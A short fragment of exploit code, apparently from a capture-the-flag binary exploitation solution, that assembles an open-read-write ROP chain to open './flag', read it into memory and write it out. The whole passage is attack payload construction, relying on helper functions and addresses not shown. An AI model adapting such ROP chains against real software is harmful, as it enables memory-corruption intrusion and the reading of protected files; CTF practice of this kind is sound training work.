...
payload += orw_rop(ROP_chain + 0x270,0,0,2) #open
payload += orw_rop(3,bss_addr,0x30,0) #read
payload += orw_rop(1,bss_addr,0x30,1) #wirte
payload  = payload.ljust(0x100,'\x00') + './flag\x00\x00'
